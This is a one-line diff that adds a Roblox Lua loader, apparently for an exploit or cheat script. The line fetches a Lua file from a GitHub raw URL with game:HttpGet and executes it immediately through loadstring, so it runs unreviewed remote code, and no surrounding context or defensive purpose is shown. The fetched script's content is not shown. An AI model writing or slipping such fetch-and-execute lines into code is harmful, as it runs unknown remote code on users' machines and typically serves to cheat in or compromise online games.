@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Reptiled1/boblok/main/thegrandcrossing.lua"))()
